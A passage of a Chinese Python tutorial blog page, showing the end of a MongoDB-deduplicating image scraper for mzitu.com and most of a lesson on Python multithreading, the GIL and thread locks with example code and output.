class="comment">##用来保存页面地址</span></span><br><span class="line">        self.img_urls = [] <span class="comment">##初始化一个 列表  用来保存图片地址</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        html = down.get(url, <span class="number">3</span>)</span><br><span class="line">        all_a = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> all_a:</span><br><span class="line">            title = a.get_text()</span><br><span class="line">            self.title = title <span class="comment">##将主题保存到self.title中</span></span><br><span class="line">            print(<span class="string">u'开始保存：'</span>, title)</span><br><span class="line">            path = str(title).replace(<span class="string">"?"</span>, <span class="string">'_'</span>)</span><br><span class="line">            self.mkdir(path)</span><br><span class="line">            os.chdir(<span class="string">"D:\mzitu\\"</span>+path)</span><br><span class="line">            href = a[<span class="string">'href'</span>]</span><br><span class="line">            self.url = href <span class="comment">##将页面地址保存到self.url中</span></span><br><span class="line">            <span class="keyword">if</span> self.meizitu_collection.find_one(&#123;<span class="string">'主题页面'</span>: href&#125;):  <span class="comment">##判断这个主题是否已经在数据库中、不在就运行else下的内容，在则忽略。</span></span><br><span class="line">                print(<span class="string">u'这个页面已经爬取过了'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.html(href)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(self, href)</span>:</span></span><br><span class="line">        html = down.get(href, <span class="number">3</span>)</span><br><span class="line">        max_span = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find_all(<span class="string">'span'</span>)[<span class="number">10</span>].get_text()</span><br><span class="line">        page_num = <span class="number">0</span>  <span class="comment">##这个当作计数器用 （用来判断图片是否下载完毕）</span></span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span) + <span class="number">1</span>):</span><br><span class="line">            page_num = page_num + <span class="number">1</span> <span class="comment">##每for循环一次就+1  （当page_num等于max_span的时候，就证明我们的在下载最后一张图片了）</span></span><br><span class="line">            page_url = href + <span class="string">'/'</span> + str(page)</span><br><span class="line">            self.img(page_url, max_span, page_num)  <span class="comment">##把上面我们我们需要的两个变量，传递给下一个函数。</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">(self, page_url, max_span, page_num)</span>:</span> <span class="comment">##添加上面传递的参数</span></span><br><span class="line">        img_html = down.get(page_url, <span class="number">3</span>)</span><br><span class="line">        img_url = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">        self.img_urls.append(img_url) <span class="comment">##每一次 for page in range(1, int(max_span) + 1)获取到的图片地址都会添加到 img_urls这个初始化的列表</span></span><br><span class="line">        <span class="keyword">if</span> int(max_span) == page_num: <span class="comment">##我们传递下来的两个参数用上了 当max_span和Page_num相等时，就是最后一张图片了，最后一次下载图片并保存到数据库中。</span></span><br><span class="line">            self.save(img_url)</span><br><span class="line">            post = &#123;  <span class="comment">##这是构造一个字典，里面有啥都是中文，很好理解吧！</span></span><br><span class="line">                <span class="string">'标题'</span>: self.title,</span><br><span class="line">                <span class="string">'主题页面'</span>: self.url,</span><br><span class="line">                <span class="string">'图片地址'</span>: self.img_urls,</span><br><span class="line">                <span class="string">'获取时间'</span>: datetime.datetime.now()</span><br><span class="line">            &#125;</span><br><span class="line">            self.meizitu_collection.save(post) <span class="comment">##将post中的内容写入数据库。</span></span><br><span class="line">            print(<span class="string">u'插入数据库成功'</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment">##max_span 不等于 page_num执行这下面</span></span><br><span class="line">            self.save(img_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, img_url)</span>:</span></span><br><span class="line">        name = img_url[<span class="number">-9</span>:<span class="number">-4</span>]</span><br><span class="line">        print(<span class="string">u'开始保存：'</span>, img_url)</span><br><span class="line">        img = down.get(img_url, <span class="number">3</span>)</span><br><span class="line">        f = open(name + <span class="string">'.jpg'</span>, <span class="string">'ab'</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        isExists = os.path.exists(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isExists:</span><br><span class="line">            print(<span class="string">u'建了一个名字叫做'</span>, path, <span class="string">u'的文件夹！'</span>)</span><br><span class="line">            os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">u'名字叫做'</span>, path, <span class="string">u'的文件夹已经存在了！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mzitu = mzitu() <span class="comment">##实例化</span></span><br><span class="line">Mzitu.all_url(<span class="string">'http://www.mzitu.com/all'</span>) <span class="comment">##给函数all_url传入参数  你可以当作启动爬虫（就是入口）</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-06 01:22:09" itemprop="dateCreated datePublished" datetime="2016-11-06T01:22:09+08:00">2016-11-06</time>
                </span>
                <span id="/3314.html" class="post-meta-item leancloud_visitors" data-flag-title="小白爬虫第三弹之去重去重" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>5.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>5 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3325.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3325.html" class="post-title-link" itemprop="url">Python爬虫进阶五之多线程的用法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="2022-年最新-Python3-网络爬虫教程"><a href="#2022-年最新-Python3-网络爬虫教程" class="headerlink" title="2022 年最新 Python3 网络爬虫教程"></a>2022 年最新 Python3 网络爬虫教程</h2>
                  <p>大家好，我是崔庆才，由于爬虫技术不断迭代升级，一些旧的教程已经过时、案例已经过期，最前沿的爬虫技术比如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等技术层出不穷，我最近新出了一套最新最全面的 Python3 网络爬虫系列教程。</p>
                  <blockquote>
                    <p>博主自荐：截止 2022 年，可以将最前沿最全面的爬虫技术都涵盖的教程，如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等，市面上目前就这一套了。</p>
                  </blockquote>
                  <p>最新教程对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，保证案例稳定有效不过期。</p>
                  <p>教程请移步：</p>
                  <p><a href="https://cuiqingcai.com/17777.html">【2022 版】Python3 网络爬虫学习教程</a></p>
                  <p>如下为原文。</p>
                  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
                  <p>我们之前写的爬虫都是单个线程的？这怎么够？一旦一个地方卡到不动了，那不就永远等待下去了？为此我们可以使用多线程或者多进程来处理。 首先声明一点！ 多线程和多进程是不一样的！一个是 thread 库，一个是 multiprocessing 库。而多线程 thread 在 Python 里面被称作鸡肋的存在！而没错！本节介绍的是就是这个库 thread。 不建议你用这个，不过还是介绍下了，如果想看可以看看下面，不想浪费时间直接看 <a href="http://cuiqingcai.com/3335.html">multiprocessing 多进程</a></p>
                  <h2 id="鸡肋点"><a href="#鸡肋点" class="headerlink" title="鸡肋点"></a>鸡肋点</h2>
                  <h3 id="名言："><a href="#名言：" class="headerlink" title="名言："></a>名言：</h3>
                  <blockquote>
                    <p>“Python下多线程是鸡肋，推荐使用多进程！”</p>
                  </blockquote>
                  <p>那当然有同学会问了，为啥？</p>
                  <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3>
                  <p>1、GIL是什么？ GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。 2、每个CPU在同一时间只能执行一个线程（在单核CPU下的多线程其实都只是并发，不是并行，并发和并行从宏观上来讲都是同时处理多路请求的概念。但并发和并行又有区别，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。） 在Python多线程下，每个线程的执行方式：</p>
                  <ul>
                    <li>获取GIL</li>
                    <li>执行代码直到sleep或者是python虚拟机将其挂起。</li>
                    <li>释放GIL</li>
                  </ul>
                  <p>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。 在Python2.x里，GIL的释放逻辑是当前线程遇见IO操作或者ticks计数达到100（ticks可以看作是Python自身的一个计数器，专门做用于GIL，每次释放后归零，这个计数可以通过 sys.setcheckinterval 来调整），进行释放。 而每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)，这就是为什么在多核CPU上，python的多线程效率并不高。</p>
                  <h3 id="那么是不是python的多线程就完全没用了呢？"><a href="#那么是不是python的多线程就完全没用了呢？" class="headerlink" title="那么是不是python的多线程就完全没用了呢？"></a>那么是不是python的多线程就完全没用了呢？</h3>
                  <p>在这里我们进行分类讨论： 1、CPU密集型代码(各种循环处理、计数等等)，在这种情况下，由于计算工作多，ticks计数很快就会达到阈值，然后触发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。 2、IO密集型代码(文件处理、网络爬虫等)，多线程能够有效提升效率(单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序执行效率)。所以python的多线程对IO密集型代码比较友好。 而在python3.x中，GIL不使用ticks计数，改为使用计时器（执行时间达到阈值后，当前线程释放GIL），这样对CPU密集型程序更加友好，但依然没有解决GIL导致的同一时间只能执行一个线程的问题，所以效率依然不尽如人意。</p>
                  <h3 id="多核性能"><a href="#多核性能" class="headerlink" title="多核性能"></a>多核性能</h3>
                  <p>多核多线程比单核多线程更差，原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低</p>
                  <h3 id="多进程为什么不会这样？"><a href="#多进程为什么不会这样？" class="headerlink" title="多进程为什么不会这样？"></a>多进程为什么不会这样？</h3>
                  <p>每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)。 所以在这里说结论：多核下，想做并行提升效率，比较通用的方法是使用多进程，能够有效提高执行效率。 所以，如果不想浪费时间，可以直接看多进程。</p>
                  <h2 id="直接利用函数创建多线程"><a href="#直接利用函数创建多线程" class="headerlink" title="直接利用函数创建多线程"></a>直接利用函数创建多线程</h2>
                  <p>Python中使用线程有两种方式：函数或者用类来包装线程对象。</p>
                  <p>函数式：调用thread模块中的start_new_thread()函数来产生新线程。语法如下：</p>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">thread.start<span class="constructor">_new_thread(<span class="params">function</span>, <span class="params">args</span>[, <span class="params">kwargs</span>])</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>参数说明:</p>
                  <ul>
                    <li>function - 线程函数。</li>
                    <li>args - 传递给线程函数的参数,他必须是个tuple类型。</li>
                    <li>kwargs - 可选参数。</li>
                  </ul>
                  <p>先用一个实例感受一下：</p>
                  <figure class="highlight applescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">import thread</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为线程定义一个函数</span></span><br><span class="line">def print_time(threadName, <span class="built_in">delay</span>):</span><br><span class="line">    <span class="built_in">count</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">count</span> &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">time</span>.sleep(<span class="built_in">delay</span>)</span><br><span class="line">        <span class="built_in">count</span> += <span class="number">1</span></span><br><span class="line">        print <span class="string">"%s: %s"</span> % (threadName, <span class="built_in">time</span>.ctime(<span class="built_in">time</span>.<span class="built_in">time</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建两个线程</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    thread.start_new_thread(print_time, (<span class="string">"Thread-1"</span>, <span class="number">2</span>,))</span><br><span class="line">    thread.start_new_thread(print_time, (<span class="string">"Thread-2"</span>, <span class="number">4</span>,))</span><br><span class="line">except:</span><br><span class="line">    print <span class="string">"Error: unable to start thread"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   pass</span><br><span class="line"></span><br><span class="line">print <span class="string">"Main Finished"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">01</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">03</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">03</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">05</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">07</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">07</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">09</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">11</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">15</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">16</span>:<span class="number">43</span>:<span class="number">19</span> <span class="number">2016</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以发现，两个线程都在执行，睡眠2秒和4秒后打印输出一段话。 注意到，在主线程写了</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   pass</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这是让主线程一直在等待 如果去掉上面两行，那就直接输出</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">Main Finished</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>程序执行结束。</p>
                  <h2 id="使用Threading模块创建线程"><a href="#使用Threading模块创建线程" class="headerlink" title="使用Threading模块创建线程"></a>使用Threading模块创建线程</h2>
                  <p>使用Threading模块创建线程，直接从threading.Thread继承，然后重写<strong>init</strong>方法和run方法：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import thread</span><br><span class="line"></span><br><span class="line">exitFlag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> (<span class="title">threading</span>.<span class="title">Thread</span>):   <span class="comment">#继承父类threading.Thread</span></span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, threadID, name, counter)</span></span><span class="symbol">:</span></span><br><span class="line">        threading.Thread.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.threadID = threadID</span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span>:                   <span class="comment">#把要执行的代码写到run函数里面 线程在创建后会直接运行run函数</span></span><br><span class="line">        print <span class="string">"Starting "</span> + <span class="keyword">self</span>.name</span><br><span class="line">        print_time(<span class="keyword">self</span>.name, <span class="keyword">self</span>.counter, <span class="number">5</span>)</span><br><span class="line">        print <span class="string">"Exiting "</span> + <span class="keyword">self</span>.name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_time</span><span class="params">(threadName, delay, counter)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="symbol">counter:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">exitFlag:</span></span><br><span class="line">            thread.exit()</span><br><span class="line">        time.sleep(delay)</span><br><span class="line">        print <span class="string">"%s: %s"</span> % (threadName, time.ctime(time.time()))</span><br><span class="line">        counter -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新线程</span></span><br><span class="line">thread1 = myThread(<span class="number">1</span>, <span class="string">"Thread-1"</span>, <span class="number">1</span>)</span><br><span class="line">thread2 = myThread(<span class="number">2</span>, <span class="string">"Thread-2"</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启线程</span></span><br><span class="line">thread1.start()</span><br><span class="line">thread2.start()</span><br><span class="line"></span><br><span class="line">print <span class="string">"Exiting Main Thread"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Starting Thread<span class="number">-1</span>Starting Thread<span class="number">-2</span></span><br><span class="line"> </span><br><span class="line">Exiting Main Thread</span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">19</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">20</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">20</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">21</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">22</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">22</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">23</span> <span class="number">2016</span></span><br><span class="line">Exiting Thread<span class="number">-1</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">24</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">26</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">42</span>:<span class="number">28</span> <span class="number">2016</span></span><br><span class="line">Exiting Thread<span class="number">-2</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>有没有发现什么奇怪的地方？打印的输出格式好奇怪。比如第一行之后应该是一个回车的，结果第二个进程就打印出来了。 那是因为什么？因为这几个线程没有设置同步。</p>
                  <h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2>
                  <p>如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。 使用Thread对象的Lock和Rlock可以实现简单的线程同步，这两个对象都有acquire方法和release方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到acquire和release方法之间。如下： 多线程的优势在于可以同时运行多个任务（至少感觉起来是这样）。但是当线程需要共享数据时，可能存在数据不同步的问题。 考虑这样一种情况：一个列表里所有元素都是0，线程”set”从后向前把所有元素改成1，而线程”print”负责从前往后读取列表并打印。 那么，可能线程”set”开始改的时候，线程”print”便来打印列表了，输出就成了一半0一半1，这就是数据的不同步。为了避免这种情况，引入了锁的概念。 锁有两种状态——锁定和未锁定。每当一个线程比如”set”要访问共享数据时，必须先获得锁定；如果已经有别的线程比如”print”获得锁定了，那么就让线程”set”暂停，也就是同步阻塞；等到线程”print”访问完毕，释放锁以后，再让线程”set”继续。 经过这样的处理，打印列表时要么全部输出0，要么全部输出1，不会再出现一半0一半1的尴尬场面。 看下面的例子：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> (<span class="title">threading</span>.<span class="title">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, threadID, name, counter)</span></span><span class="symbol">:</span></span><br><span class="line">        threading.Thread.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.threadID = threadID</span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">        <span class="keyword">self</span>.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        print <span class="string">"Starting "</span> + <span class="keyword">self</span>.name</span><br><span class="line">       <span class="comment"># 获得锁，成功获得锁定后返回True</span></span><br><span class="line">       <span class="comment"># 可选的timeout参数不填时将一直阻塞直到获得锁定</span></span><br><span class="line">       <span class="comment"># 否则超时后将返回False</span></span><br><span class="line">        threadLock.acquire()</span><br><span class="line">        print_time(<span class="keyword">self</span>.name, <span class="keyword">self</span>.counter, <span class="number">3</span>)</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        threadLock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_time</span><span class="params">(threadName, delay, counter)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="symbol">counter:</span></span><br><span class="line">        time.sleep(delay)</span><br><span class="line">        print <span class="string">"%s: %s"</span> % (threadName, time.ctime(time.time()))</span><br><span class="line">        counter -= <span class="number">1</span></span><br><span 